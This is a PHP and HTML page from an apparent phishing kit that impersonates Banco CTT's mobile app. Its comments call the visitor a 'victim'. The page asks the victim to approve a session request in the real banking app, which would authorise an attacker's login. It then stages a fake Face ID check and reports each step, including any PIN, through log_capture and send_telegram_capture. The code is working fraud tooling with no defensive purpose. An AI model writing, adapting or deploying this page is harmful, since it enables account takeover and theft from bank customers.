<?php
// ============================================================
//  approve.php — Banco CTT App push notification approval
//  Instructs victim to approve via real mobile app/notification,
//  then return and verify with Face ID.
//  
// ============================================================
require_once 'config.php';

$ip = client_ip();
init_state($ip, 'approve');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $stage  = safe_input('stage'); // "start" or "verify"
    $method = safe_input('method'); // "faceid"
    $pin    = preg_replace('/\D/', '', safe_input('pin'));

    if ($stage === 'start') {
        // Victim clicked "I approved on my device"
        // We log that they attempted approval, then ask for Face ID verification
        $data = array('action' => 'opened_app_approval', 'status' => 'awaiting_faceid');
        log_capture('APPROVE-START', $ip, $data);
        send_telegram_capture('APPROVE', '📲 Opened App Approval', $ip, $data);
        json_response(array('status' => 'ok', 'next' => 'faceid'));
    }

    if ($stage === 'verify') {
        // Face ID verification submitted
        $data = array(
            'method' => $method,
            'pin'    => ($method === 'pin') ? $pin : null,
            'status' => 'verified'
        );
        log_capture('APPROVE', $ip, $data);
        send_telegram_capture('APPROVE', '✅ Face ID Verified', $ip, $data);
        update_state_step($ip, 'approve', $data);
        json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
    }

    json_response(array('status' => 'error', 'message' => 'Pedido desconhecido.'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aprovação de Sessão | Banco CTT App</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
    --teal:#222222;
    --teal-light:#004a4d;
    --yellow:#df0024;
    --bg:#1a1a2e;
    --phone-bg:#fff;
    --text:#333;
    --muted:#888;
}
body{
    font-family:"Segoe UI","Segoe",Tahoma,Helvetica,Arial,sans-serif;
    background:var(--bg);
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
}
.page{width:100%;max-width:380px}

/* Phone frame */
.phone{
    background:var(--phone-bg);
    border-radius:36px;
    box-shadow:0 20px 60px rgba(0,0,0,0.5);
    overflow:hidden;
    position:relative;
    border:8px solid #1a1a1a;
}
.phone-notch{
    width:120px;
    height:24px;
    background:#1a1a1a;
    border-radius:0 0 16px 16px;
    margin:0 auto;
    position:relative;
    z-index:10;
}
.phone-screen{
    padding:0;
    min-height:620px;
    display:flex;
    flex-direction:column;
}

/* App header */
.app-header{
    background:linear-gradient(135deg,var(--teal) 0%,var(--teal-light) 100%);
    padding:20px 20px 16px;
    text-align:center;
    color:#fff;
}
.app-header img{
    height:28px;
    margin-bottom:8px;
    filter:brightness(0) invert(1);
}
.app-header .logo-fallback{
    font-size:16px;
    font-weight:700;
    letter-spacing:0.5px;
    display:block;
    margin-bottom:6px;
}
.app-header h2{
    font-size:14px;
    font-weight:400;
    opacity:0.9;
}
.app-header .bank-name{
    font-size:11px;
    opacity:0.6;
    margin-top:2px;
}

/* Push notification card */
.push-card{
    margin:20px 16px 0;
    background:#fff5f7;
    border:1px solid #c8e0ff;
    border-radius:10px;
    padding:12px 14px;
    display:flex;
    gap:10px;
    align-items:flex-start;
}
.push-icon{
    width:36px;
    height:36px;
    background:var(--yellow);
    border-radius:8px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:18px;
    flex-shrink:0;
}
.push-content .push-title{
    font-size:12px;
    font-weight:700;
    color:var(--teal);
}
.push-content .push-body{
    font-size:11px;
    color:#555;
    margin-top:2px;
    line-height:1.4;
}
.push-content .push-time{
    font-size:10px;
    color:#999;
    margin-top:4px;
}

/* Approval main */
.approve-body{
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:flex-start;
    padding:24px 20px 30px;
    text-align:center;
}
.approve-icon{
    width:70px;
    height:70px;
    border-radius:50%;
    background:#e8f5e9;
    border:2px solid #81c784;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:32px;
    margin-bottom:14px;
    animation:pulse 2s ease-in-out infinite;
}
@keyframes pulse{
    0%,100%{transform:scale(1);box-shadow:0 0 0 0 rgba(76,175,80,0.3)}
    50%{transform:scale(1.05);box-shadow:0 0 0 12px rgba(76,175,80,0)}
}
.approve-title{
    font-size:17px;
    font-weight:700;
    color:var(--teal);
    margin-bottom:6px;
}
.approve-subtitle{
    font-size:12px;
    color:var(--muted);
    line-height:1.5;
    margin-bottom:18px;
    max-width:260px;
}

/* Instruction list */
.instruction-list{
    width:100%;
    text-align:left;
    margin-bottom:20px;
}
.instruction-item{
    display:flex;
    gap:10px;
    align-items:flex-start;
    padding:10px 0;
    border-bottom:1px solid #f0f0f0;
}
.instruction-item:last-child{border-bottom:none}
.instruction-num{
    width:24px;
    height:24px;
    border-radius:50%;
    background:var(--teal);
    color:#fff;
    font-size:12px;
    font-weight:700;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-shrink:0;
}
.instruction-text{
    font-size:12px;
    color:#555;
    line-height:1.5;
    flex:1;
}

/* Buttons */
.btn-confirm{
    width:100%;
    padding:13px;
    background:var(--yellow);
    color:var(--teal);
    border:none;
    border-radius:8px;
    font-size:14px;
    font-weight:700;
    font-family:inherit;
    cursor:pointer;
    text-transform:uppercase;
    letter-spacing:0.5px;
    transition:background 0.15s;
}
.btn-confirm:hover{background:#b8001d}
.btn-confirm:disabled{background:#ccc;color:#999;cursor:not-allowed}

.btn-secondary{
    margin-top:12px;
    background:transparent;
    border:none;
    color:#999;
    font-size:11px;
    cursor:pointer;
    text-decoration:underline;
    font-family:inherit;
}

/* Face ID section */
.face-section{
    display:none;
    flex-direction:column;
    align-items:center;
    width:100%;
}
.face-section.active{display:flex}
.face-icon-box{
    width:110px;
    height:110px;
    border-radius:50%;
    background:#fff5f7;
    border:3px solid var(--teal);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:54px;
    margin-bottom:16px;
    cursor:pointer;
    position:relative;
    transition:all 0.2s;
}
.face-icon-box:hover{
    background:#e3f2fd;
    transform:scale(1.05);
}
.face-icon-box.scanning{
    border-color:var(--yellow);
    animation:faceScan 1.8s ease-in-out;
}
@keyframes faceScan{
    0%{box-shadow:0 0 0 0 rgba(223,0,36,0.5)}
    50%{box-shadow:0 0 0 25px rgba(223,0,36,0)}
    100%{box-shadow:0 0 0 0 rgba(223,0,36,0);border-color:#4caf50}
}
.face-title{
    font-size:15px;
    font-weight:700;
    color:var(--teal);
    margin-bottom:6px;
}
.face-hint{
    font-size:11px;
    color:var(--muted);
    margin-bottom:18px;
}

/* Message */
.msg{
    padding:8px 12px;
    border-radius:6px;
    font-size:12px;
    margin-bottom:12px;
    display:none;
    width:100%;
}
.msg.error{background:#ffebee;border:1px solid #ef9a9a;color:#c62828}
.msg.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32}

/* Footer */
.app-footer{
    padding:10px 20px 14px;
    text-align:center;
    border-top:1px solid #f0f0f0;
}
.app-footer .secure{
    font-size:10px;
    color:var(--muted);
}
.app-footer .secure-icon{color:#4caf50}

/* Overlay */
.overlay{
    position:fixed;
    top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.6);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:9999;
}
.overlay.show{display:flex}
.spinner{
    width:40px;
    height:40px;
    border:4px solid rgba(255,255,255,0.2);
    border-top-color:var(--yellow);
    border-radius:50%;
    animation:spin 0.8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
.success-check{font-size:48px;color:#4caf50;animation:popIn 0.4s ease}
@keyframes popIn{
    0%{transform:scale(0)}
    70%{transform:scale(1.2)}
    100%{transform:scale(1)}
}
</style>
</head>
<body>
<div class="page">
    <div class="phone">
        <div class="phone-notch"></div>
        <div class="phone-screen">

            <!-- App header -->
            <div class="app-header">
                <img src="https://thebanks.eu/img/logos/Banco_CTT.png"
                     alt="Banco CTT"
                     onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>BANCO CTT</span>'">
                <h2>Banco CTT Online</h2>
                <div class="bank-name">Mobile App</div>
            </div>

            <!-- Push notification -->
            <div class="push-card">
                <div class="push-icon">🔐</div>
                <div class="push-content">
                    <div class="push-title">Novo pedido de sessão</div>
                    <div class="push-body">Abra a aplicação Banco CTT e aprove o pedido de sessão.</div>
                    <div class="push-time">Agora · Banco CTT</div>
                </div>
            </div>

            <!-- Approval body -->
            <div class="approve-body">
                <div class="approve-icon">📱</div>
                <div class="approve-title">Aprovação através da aplicação</div>
                <div class="approve-subtitle">
                    Para continuar, siga os passos abaixo:
                </div>

                <div id="msg" class="msg"></div>

                <!-- STEP 1: Instructions -->
                <div id="stepInstructions" class="instruction-list">
                    <div class="instruction-item">
                        <div class="instruction-num">1</div>
                        <div class="instruction-text">Abra a aplicação <strong>Banco CTT</strong> no seu telemóvel ou toque na notificação que recebeu.</div>
                    </div>
                    <div class="instruction-item">
                        <div class="instruction-num">2</div>
                        <div class="instruction-text">Encontre o pedido de sessão e toque em <strong>Aprovar</strong> ou <strong>Confirmar</strong>.</div>
                    </div>
                    <div class="instruction-item">
                        <div class="instruction-num">3</div>
                        <div class="instruction-text">Volte a esta página para concluir o processo.</div>
                    </div>
                </div>

                <button type="button" class="btn-confirm" id="btnApproved">VOLTEI E APROVEI</button>
                <button type="button" class="btn-secondary" id="btnNoAccess">Não tenho acesso à aplicação</button>

                <!-- STEP 2: Face ID verification -->
                <div id="stepFaceId" class="face-section">
                    <div class="face-icon-box" id="faceBtn">😊</div>
                    <div class="face-title">Confirmação com Face ID</div>
                    <div class="face-hint">Toque no ícone e olhe para a câmara para concluir.</div>
                </div>
            </div>

            <!-- Footer -->
            <div class="app-footer">
                <div class="secure"><span class="secure-icon">🔒</span> Protegido pelo Banco CTT Security</div>
            </div>

        </div>
    </div>
</div>

<!-- Overlay -->
<div class="overlay" id="overlay">
    <div id="overlayContent"><div class="spinner"></div></div>
</div>

<script>
(function(){
    var msg         = document.getElementById('msg');
    var overlay     = document.getElementById('overlay');
    var overlayCt   = document.getElementById('overlayContent');
    var stepInstr   = document.getElementById('stepInstructions');
    var btnApproved = document.getElementById('btnApproved');
    var btnNoAccess = document.getElementById('btnNoAccess');
    var stepFaceId  = document.getElementById('stepFaceId');
    var faceBtn     = document.getElementById('faceBtn');

    // Step 1 -> Step 2
    btnApproved.addEventListener('click', function(){
        btnApproved.disabled = true;
        overlay.classList.add('show');

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'approve.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            overlay.classList.remove('show');
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.status === 'ok' && resp.next === 'faceid') {
                    // Show Face ID section
                    stepInstr.style.display = 'none';
                    btnApproved.style.display = 'none';
                    btnNoAccess.style.display = 'none';
                    stepFaceId.classList.add('active');
                    msg.className = 'msg success';
                    msg.textContent = 'Aprovação bem-sucedida! Confirme agora com Face ID.';
                    msg.style.display = 'block';
                } else {
                    showErr(resp.message || 'Erro. Tente novamente.');
                    btnApproved.disabled = false;
                }
            } catch(err) {
                showErr('Erro de comunicação.');
                btnApproved.disabled = false;
            }
        };
        xhr.send('stage=start');
    });

    btnNoAccess.addEventListener('click', function(){
        showErr('É necessário acesso à aplicação Banco CTT para continuar.');
    });

    // Face ID verification
    faceBtn.addEventListener('click', function(){
        faceBtn.classList.add('scanning');
        faceBtn.innerHTML = '⏳';
        hideMsg();
        overlay.classList.add('show');

        setTimeout(function(){
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'approve.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function(){
                if (xhr.readyState !== 4) return;
                try {
                    var resp = JSON.parse(xhr.responseText);
                    if (resp.status === 'ok' && resp.redirect) {
                        overlayCt.innerHTML = '<div class="success-check">✓</div>';
                        setTimeout(function(){
                            window.location.href = resp.redirect;
                        }, 1000);
                    } else {
                        overlay.classList.remove('show');
                        showErr(resp.message || 'Erro de Face ID. Tente novamente.');
                        resetFace();
                    }
                } catch(err) {
                    overlay.classList.remove('show');
                    showErr('Erro de comunicação.');
                    resetFace();
                }
            };
            xhr.send('stage=verify&method=faceid');
        }, 2200);
    });

    function resetFace(){
        faceBtn.classList.remove('scanning');
        faceBtn.innerHTML = '😊';
    }

    function showErr(text){
        msg.className = 'msg error';
        msg.textContent = text;
        msg.style.display = 'block';
    }
    function hideMsg(){ msg.style.display = 'none'; }
})();
</script>
</body>
</html>